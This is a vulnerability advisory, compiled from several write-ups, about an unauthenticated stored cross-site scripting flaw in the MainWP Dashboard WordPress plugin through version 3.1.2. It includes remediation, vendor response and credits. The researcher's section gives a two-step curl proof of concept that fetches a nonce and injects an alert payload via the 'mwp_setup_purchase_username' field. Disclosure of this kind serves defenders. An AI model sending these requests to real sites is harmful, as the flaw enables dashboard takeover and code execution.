### Description

The MainWP Dashboard – The Private WordPress Manager for Multiple Website Maintenance plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘mwp\_setup\_purchase\_username’ parameter in versions up to, and including, 3.1.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

# WordPress Plugin MainWP Dashboard Cross-Site Scripting (3.1.2)

## Description

WordPress Plugin MainWP Dashboard is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. WordPress Plugin MainWP Dashboard version 3.1.2 is vulnerable; prior versions may also be affected.

## Remediation

Update to plugin version 3.1.3 or latest

# MainWP admin panel unauthenticated stored XSS

[MainWP](https://mainwp.com/) is a WordPress remote administration plugin. Missing authorization checks on a setup panel allowed unauthenticated attackers to modify some of the MainWP settings. At least one of these settings could be used to inject arbitrary JavaScript in the WordPress Dashboard. Under default configuration this leads to server-side code execution.

### Details

After installing MainWP the plugin presents a quick setup panel which asks the administrator to select and enter some configuration options. When requested in a certain way, the quick setup page doesn’t require login and anyone can alter the settings.

Proof of concept: first, a *nonce* can be retrieved with the following UNIX command:

```
curl 'http://WEBSITE/wp-admin/admin-post.php?page=mainwp-setup&step=installation' | grep _wpnonce

```

The settings can then be modified. The following command exploits a secondary stored XSS to inject some JavaScript:

```
curl -F 'mwp_setup_purchase_username=aaa" onmouseover=alert(/xss/);//' -F mwp_setup_purchase_passwd=bbb -F save_step=1 'http://WEBSITE/wp-admin/admin-post.php?page=mainwp-setup&step=purchase_extension&_wpnonce=NONCE_FROM_PREVIOUS_COMMAND'

```

The script is stored in the WordPress options database. When any administrator next views the MainWP Extensions setting panel, the script will be executed, showing an alert box.

As with other WordPress XSS’s, the impact of this bug is normally server-side code execution because the script can e.g. use AJAX requests to access the theme and plugin editors.

### Vendor response

MainWP was notified on April 18. The latest MainWP update addresses this vulnerability. A bug bounty of $50 was awarded.

### Credits

The vulnerability was discovered and researched by Jouko Pynnönen of [Klikki](https://klikki.fi/) Oy, Finland.
